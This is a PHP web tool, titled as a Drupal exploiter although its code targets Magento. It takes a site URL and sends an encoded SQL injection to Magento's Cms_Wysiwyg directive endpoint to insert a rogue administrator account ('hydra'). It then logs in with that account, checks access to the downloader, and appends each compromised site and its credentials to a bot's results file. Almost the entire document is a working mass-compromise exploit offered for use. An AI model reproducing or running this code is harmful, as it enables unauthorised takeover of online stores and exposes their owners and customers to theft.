<!Doctype HTML>
<html>
<head>
<HEAD>
<!-- By the way no one is the real coder of this shit :)  -->
<link href="" rel="stylesheet" type="text/css">
	<link rel="shortcut icon" href="http://tommiesports.com/images/setup/header_logo.png" />

    <title>Drupal Exploiter Mister Spy</title>
<style type='text/css'>
body{
background:url('') no-repeat center;
font-family:Chaparral Pro;
background-color:#BDBDBD;
}
textarea{
margin-top:none;
font-family:Chaparral Pro;
color:grey;
border-radius:2px;
box-shadow:0px 0px 20px grey;
border-left:2px solid grey;
border-top:2px solid grey;
border-bottom:1px solid grey;
border-right:1px solid grey;
}
}
input{
font-family:Chaparral Pro;
color:black;
border-radius:2px;
box-shadow:0px 0px 20px red;
border:2px solid red;
}
</style>
</head>
<body>
    <div class="mymargin">
        <center>
    <form method="GET" action="">
        Site : <input type="text" name="url" placeholder="">
        <input type="submit" name="submit" value="submit">
    </form>
    <br>
<?php
error_reporting(0);
if(isset($_GET['submit'])){
set_time_limit(0);
$banner = 'Trying Magento Add Admin ...  ';
function bersihkan($htmltags)
{
    $htmltags = str_replace('<span class="price">', '', $htmltags);
    $htmltags = str_replace('</span>', '', $htmltags);
    return $htmltags;

}

$postadm = "filter=cG9wdWxhcml0eVtmcm9tXT0wJnBvcHVsYXJpdHlbdG9dPTMmcG9wdWxhcml0eVtmaWVsZF9leHByXT0wKTtTRVQgQFNBTFQgPSAncnAnO1NFVCBAUEFTUyA9IENPTkNBVChNRDUoQ09OQ0FUKCBAU0FMVCAsICdoeWRyYTc3JykgKSwgQ09OQ0FUKCc6JywgQFNBTFQgKSk7U0VMRUNUIEBFWFRSQSA6PSBNQVgoZXh0cmEpIEZST00gYWRtaW5fdXNlciBXSEVSRSBleHRyYSBJUyBOT1QgTlVMTDtJTlNFUlQgSU5UTyBgYWRtaW5fdXNlcmAgKGBmaXJzdG5hbWVgLCBgbGFzdG5hbWVgLGBlbWFpbGAsYHVzZXJuYW1lYCxgcGFzc3dvcmRgLGBjcmVhdGVkYCxgbG9nbnVtYCxgcmVsb2FkX2FjbF9mbGFnYCxgaXNfYWN0aXZlYCxgZXh0cmFgLGBycF90b2tlbmAsYHJwX3Rva2VuX2NyZWF0ZWRfYXRgKSBWQUxVRVMgKCdGaXJzdG5hbWUnLCdMYXN0bmFtZScsJ2VtYWlsQGV4YW1wbGUuY29tJywnaHlkcmEnLEBQQVNTLE5PVygpLDAsMCwxLEBFWFRSQSxOVUxMLCBOT1coKSk7SU5TRVJUIElOVE8gYGFkbWluX3JvbGVgIChwYXJlbnRfaWQsdHJlZV9sZXZlbCxzb3J0X29yZGVyLHJvbGVfdHlwZSx1c2VyX2lkLHJvbGVfbmFtZSkgVkFMVUVTICgxLDIsMCwnVScsKFNFTEVDVCB1c2VyX2lkIEZST00gYWRtaW5fdXNlciBXSEVSRSB1c2VybmFtZSA9ICdoeWRyYScpLCdGaXJzdG5hbWUnKTs%3D&___directive=e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ&forwarded=1";
$postlog = "form_key=3ryAIBlm7bJ3naj9&login%5Busername%5D=hydra&login%5Bpassword%5D=hydra77";
$postdwn = "username=hydra&password=hydra77";
$pageadm = "/admin/Cms_Wysiwyg/directive/index/";
$pagelog = "/admin/";
$pagedwn = "/downloader/";

function stupid_CURL($url, $data, $page)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url . $page);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';

    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
}

if(isset($_GET['submit'])){
    $site = $_GET['url']."/";

  $hajar = stupid_CURL($site, $postadm, $pageadm);

    if (preg_match('#200 OK#', $hajar)) {
        $expres = "Success :D \n";
        $ceklog = stupid_CURL($site, $postlog, $pagelog);


        if (preg_match('#302 Moved#', $ceklog)) {
            preg_match_all('#<span class="price">(.*?)</span>#si', $ceklog, $match);
            foreach ($match as $val) {
                $ltm = $val[0];
                $avo = $val[1];
                break;
            }
            $admlog = "Success";
            $user = "hydra";
            $pass = "hydra77";
            $cekdwn = stupid_CURL($site, $postdwn, $pagedwn);
            if (preg_match('#Return to Admin#', $cekdwn)) {
                $dwnlog = "Login Success";
                $misterspy = "[Magento] $site/admin/ user : hydra  pass :hydra77 \n";

                /**
                 * $file = fopen("mrspy.htm","a"); // add by mister spy just to get rzlt :D :p ask wahib later about this fucking prob
                 * fwrite($file,$misterspy);
                 * fclose($file);
                 */

                // Love you too.. -Tube
                file_put_contents("../BotV2/brute.txt", $misterspy, FILE_APPEND | LOCK_EX);


                echo 'Success :D\n';
            }
        } else {
           echo 'Failed... :(\n';
        }
    }else{
        echo "Failed .... :(\n";
    }
}



?>
